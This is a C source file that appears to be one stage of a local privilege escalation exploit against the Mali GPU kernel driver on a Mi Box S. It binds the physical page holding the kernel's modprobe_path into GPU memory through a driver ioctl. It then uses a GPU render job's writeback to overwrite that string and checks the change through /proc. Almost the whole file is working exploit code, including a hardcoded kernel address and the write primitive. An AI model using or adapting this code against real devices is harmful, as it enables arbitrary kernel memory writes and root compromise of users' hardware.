/*
 * kort_pp_diag3.c - Phase 3: BIND external phys mem + WB write test
 *
 * Uses the FIXED PLB (no B0 instruction) that works from diag2.
 * Tests: can we write to a BIND'd external physical page via WB?
 *
 * SAFETY: we write to modprobe_path page, but only the first 4 bytes,
 * and we restore them immediately. Use --verify mode.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>

#define MALI_IOC_MEM_ALLOC      0xC0288300u
#define MALI_IOC_MEM_BIND       0xC0288302u
#define MALI_IOC_MEM_UNBIND     0xC0108303u
#define MALI_IOC_PP_START_JOB   0xC1988400u
#define MALI_IOC_WAIT_FOR_NOTIFICATION 0xC0688202u

#define _MALI_NOTIFICATION_PP_FINISHED ((2 << 16) | 0x10)
#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY (1 << 11)

typedef struct {
    uint64_t ctx; uint32_t gpu_vaddr; uint32_t vsize; uint32_t psize;
    uint32_t flags; uint64_t backend_handle; int32_t secure_shared_fd;
} mali_uk_alloc_mem_s;

typedef struct {
    uint64_t ctx; uint32_t vaddr; uint32_t size; uint32_t flags;
    uint32_t padding; uint32_t phys_addr; uint32_t rights;
    uint32_t bind_flags; uint32_t pad2;
} mali_uk_bind_mem_s;

typedef struct {
    uint64_t ctx; uint32_t vaddr; uint32_t flags;
} mali_uk_unbind_mem_s;

#define MALI_UK_TIMELINE_MAX 3
typedef struct { uint32_t points[MALI_UK_TIMELINE_MAX]; int32_t sync_fd; } mali_uk_fence_t;

typedef struct {
    uint64_t ctx; uint64_t user_job_ptr; uint32_t priority;
    uint32_t frame_registers[23];
    uint32_t frame_registers_addr_frame[7];
    uint32_t frame_registers_addr_stack[7];
    uint32_t wb0_registers[12]; uint32_t wb1_registers[12]; uint32_t wb2_registers[12];
    uint32_t dlbu_registers[4];
    uint32_t num_cores; uint32_t perf_counter_flag;
    uint32_t perf_counter_src0; uint32_t perf_counter_src1;
    uint32_t frame_builder_id; uint32_t flush_id; uint32_t flags;
    uint32_t tilesx; uint32_t tilesy; uint32_t heatmap_mem;
    uint32_t num_memory_cookies; uint64_t memory_cookies;
    mali_uk_fence_t fence; uint64_t timeline_point_ptr;
} mali_uk_pp_start_job_s;

typedef struct {
    uint64_t ctx; uint32_t type; uint32_t _pad; uint8_t data[88];
} mali_uk_wait_for_notification_s;

#define FR_PLBU_ARRAY_ADDR 0
#define FR_RENDER_ADDR     1
#define FR_FLAGS           3
#define FR_CLEAR_COLOR_0   6
#define FR_CLEAR_COLOR_1   7
#define FR_CLEAR_COLOR_2   8
#define FR_CLEAR_COLOR_3   9
#define FR_WIDTH          10
#define FR_HEIGHT         11
#define FR_FRAG_STACK_ADDR 12
#define FR_FRAG_STACK_SIZE 13

#define WB_TYPE         0
#define WB_ADDRESS      1
#define WB_PIXEL_FORMAT 2
#define WB_DOWNSAMPLE   3
#define WB_PIXEL_LAYOUT 4
#define WB_PITCH        5
#define WB_TARGET_FLAGS 6
#define WB_MRT_ENABLE   7

#define GPU_VA_DATA  0x40000000u
#define GPU_VA_TGT   0x40300000u
#define BUF_SIZE     0x4000

/* Mi Box S modprobe_path */
#define KERNEL_PHYS_BASE      0x01080000u
#define MODPROBE_PATH_RVA     0x175F960u
#define MODPROBE_PATH_PHYS    (KERNEL_PHYS_BASE + MODPROBE_PATH_RVA)
#define MODPROBE_PATH_PAGE    (MODPROBE_PATH_PHYS & ~0xFFFu)
#define MODPROBE_PATH_INPAGE  (MODPROBE_PATH_PHYS & 0xFFFu)

static int fd = -1;
static volatile int g_to = 0;
static void alh(int s) { (void)s; g_to = 1; }

static int tio(unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno;
    alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

static const char *status_str(uint32_t s) {
    if (s & (1 << 16)) return "SUCCESS";
    if (s & (1 << 23)) return "UNKNOWN_ERR";
    if (s & (1 << 22)) return "ILLEGAL_JOB";
    return "???";
}

/*
 * WB write u32 value to gpu_target (GPU VA) using FIXED PLB (no B0).
 * Returns 0 on SUCCESS, -1 on error, -999 on timeout/hang.
 */
static int wb_write_fixed(uint32_t *buf, uint32_t gpu_target, uint32_t value)
{
    memset(buf, 0, BUF_SIZE);

    /* Tile block (empty tile) at offset 0x200 */
    memset((uint8_t *)buf + 0x200, 0, 64);

    /* Fragment shader: output constant color */
    static const uint32_t shader[] = {
        0x00020425, 0x0000000c, 0x01e007cf, 0xb0000000, 0x000005f5,
    };
    memcpy((uint8_t *)buf + 0x080, shader, sizeof(shader));

    /* FIXED PLB: no B0 instruction (the bug was the 0xB0000000 word) */
    uint32_t *plb = buf;
    uint32_t tileblk_gpu = GPU_VA_DATA + 0x200;
    plb[0] = 0x00000000;   /* NOP */
    plb[1] = 0xB8000000;   /* tile (0,0) header */
    plb[2] = 0xE0000002 | ((tileblk_gpu >> 3) & ~0xE0000003u);  /* tile data ptr */
    plb[3] = 0xBC000000;   /* final terminator */

    /* RSW */
    uint32_t *rsw = (uint32_t *)((uint8_t *)buf + 0x100);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = (GPU_VA_DATA + 0x080) | 5;
    rsw[0x0D] = 0x00000100;

    /* PP job */
    mali_uk_pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xDEADBEEFCAFEBABEULL;
    job.num_cores = 1;

    job.frame_registers[FR_PLBU_ARRAY_ADDR] = GPU_VA_DATA + 0x000;
    job.frame_registers[FR_RENDER_ADDR]     = GPU_VA_DATA + 0x100;
    job.frame_registers[FR_FLAGS]           = 0x01;
    job.frame_registers[FR_CLEAR_COLOR_0]   = value;
    job.frame_registers[FR_CLEAR_COLOR_1]   = value;
    job.frame_registers[FR_CLEAR_COLOR_2]   = value;
    job.frame_registers[FR_CLEAR_COLOR_3]   = value;
    job.frame_registers[FR_WIDTH]           = 16;
    job.frame_registers[FR_HEIGHT]          = 16;
    job.frame_registers[FR_FRAG_STACK_ADDR] = GPU_VA_DATA + 0x1000;
    job.frame_registers[FR_FRAG_STACK_SIZE] = 0x400;

    /* WB0: write color to gpu_target */
    job.wb0_registers[WB_TYPE]         = 0x02;   /* color source */
    job.wb0_registers[WB_ADDRESS]      = gpu_target;
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;   /* RGBA8888 */
    job.wb0_registers[WB_DOWNSAMPLE]   = 0;
    job.wb0_registers[WB_PIXEL_LAYOUT] = 0;
    job.wb0_registers[WB_PITCH]        = (16 * 4) / 8;  /* = 8 (in 8-byte units) */
    job.wb0_registers[WB_TARGET_FLAGS] = 0;
    job.wb0_registers[WB_MRT_ENABLE]   = 0;

    job.fence.sync_fd = -1;
    uint32_t tl = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&tl;

    __builtin___clear_cache((char *)buf, (char *)buf + BUF_SIZE);

    int r = tio(MALI_IOC_PP_START_JOB, &job, 5);
    if (r == -999) return -999;
    if (r != 0) return r;

    mali_uk_wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    r = tio(MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 5);
    if (r == -999) return -999;
    if (r != 0) return r;

    if (notif.type != _MALI_NOTIFICATION_PP_FINISHED) return -2;

    uint32_t status;
    memcpy(&status, notif.data + 8, 4);
    return (status & (1 << 16)) ? 0 : -1;
}

static void read_modprobe(const char *tag)
{
    char cur[64] = {0};
    int pfd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (pfd >= 0) {
        ssize_t n = read(pfd, cur, 32);
        close(pfd);
        if (n > 0 && cur[n-1] == '\n') cur[n-1] = 0;
    }
    printf("  [%s] modprobe: '%s'\n", tag, cur);
}

int main(int argc, char **argv)
{
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alh;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("=== PP Job Diagnosis Phase 3: BIND + WB ===\n\n");

    int do_bind = 1;
    if (argc > 1 && !strcmp(argv[1], "--nobind")) do_bind = 0;

    fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("open /dev/mali"); return 1; }
    printf("[+] opened /dev/mali (fd=%d)\n", fd);

    /* ALLOC job buffer */
    mali_uk_alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.vsize = BUF_SIZE;
    alloc.psize = BUF_SIZE;
    if (tio(MALI_IOC_MEM_ALLOC, &alloc, 3) != 0) {
        printf("[-] ALLOC_MEM failed\n"); return 1;
    }
    printf("[+] ALLOC_MEM OK\n");

    uint32_t *buf = (uint32_t *)mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE,
                                      MAP_SHARED, fd, GPU_VA_DATA);
    if (buf == MAP_FAILED) { perror("mmap"); return 1; }
    printf("[+] mmap OK (%p)\n\n", buf);

    /* ---- Control test: write to GPU own memory (should work) ---- */
    printf("--- Control: WB to GPU own memory ---\n");
    {
        uint32_t *tgt_in_buf = (uint32_t *)((uint8_t *)buf + 0x3000);
        *tgt_in_buf = 0xDEADBEEF;
        int r = wb_write_fixed(buf, GPU_VA_DATA + 0x3000, 0x41424344);
        printf("  result: %s, data[0]=0x%08x\n",
               r == 0 ? "SUCCESS" : (r == -999 ? "HUNG" : "FAILED"),
               *tgt_in_buf);
    }

    if (!do_bind) {
        printf("\n(--nobind: skipping BIND tests)\n");
        goto done;
    }

    /* ---- BIND modprobe_path physical page ---- */
    printf("\n--- BIND modprobe_path page 0x%08x -> GPU VA 0x%08x ---\n",
           MODPROBE_PATH_PAGE, GPU_VA_TGT);
    read_modprobe("before-bind");

    {
        mali_uk_bind_mem_s b;
        memset(&b, 0, sizeof(b));
        b.vaddr = GPU_VA_TGT;
        b.size = 4096;
        b.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
        b.phys_addr = MODPROBE_PATH_PAGE;
        b.rights = 0x37;
        int r = tio(MALI_IOC_MEM_BIND, &b, 3);
        if (r == -999) { printf("[-] BIND TIMEOUT (HUNG!)\n"); goto done; }
        if (r != 0) { printf("[-] BIND failed: %s\n", strerror(-r)); goto done; }
        printf("[+] BIND OK\n\n");
    }

    /* ---- Test: WB write to BIND'd page (first 4 bytes) ---- */
    printf("--- Test: WB write to BIND'd modprobe page ---\n");
    printf("  target offset: 0x%x (modprobe_path + 0x%x)\n",
           MODPROBE_PATH_INPAGE, MODPROBE_PATH_INPAGE);
    read_modprobe("pre-write");

    /* Write "////" = 0x2F2F2F2F to first word */
    {
        uint32_t write_val = 0x2F2F2F2F;  /* "////" */
        printf("  writing 0x%08x ('////') via WB...\n", write_val);
        int r = wb_write_fixed(buf,
                               GPU_VA_TGT + MODPROBE_PATH_INPAGE,
                               write_val);
        if (r == -999) {
            printf("  [-] WB TIMEOUT / HUNG! (device may need reboot)\n");
            goto out_unbind;
        }
        printf("  result: %s\n", r == 0 ? "SUCCESS" : "FAILED");
    }

    /* Read back modprobe_path to verify */
    read_modprobe("post-write");

    /* ---- Restore: write "/sbi" (first 4 bytes of /sbin/modprobe) ---- */
    printf("\n--- Restore first 4 bytes ---\n");
    {
        /* "/sbi" = 0x6962732F in little-endian (as stored in memory) */
        /* But WB writes ARGB clear_color as RGBA bytes... */
        /* We need to figure out what value to write to get "/sbi\0" */
        /* For now, try direct: 0x00696273 = "\0ibs"? No... */
        /* Let's try writing the value we want to see in memory as u32 LE */
        /* "/sbi" bytes: 0x2F 0x73 0x62 0x69 -> LE u32 = 0x6962732F */

        uint32_t restore_val = 0x6962732F;  /* "/sbi" LE */
        printf("  writing 0x%08x to restore '/sbi'...\n", restore_val);
        int r = wb_write_fixed(buf,
                               GPU_VA_TGT + MODPROBE_PATH_INPAGE,
                               restore_val);
        if (r == -999) {
            printf("  [-] WB TIMEOUT / HUNG!\n");
            goto out_unbind;
        }
        printf("  result: %s\n", r == 0 ? "SUCCESS" : "FAILED");
    }
    read_modprobe("post-restore");

out_unbind:
    /* UNBIND */
    {
        mali_uk_unbind_mem_s u;
        memset(&u, 0, sizeof(u));
        u.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
        u.vaddr = GPU_VA_TGT;
        tio(MALI_IOC_MEM_UNBIND, &u, 3);
        printf("\n[*] UNBIND done\n");
    }

done:
    munmap(buf, BUF_SIZE);
    close(fd);
    printf("\n=== Phase 3 complete ===\n");
    return 0;
}
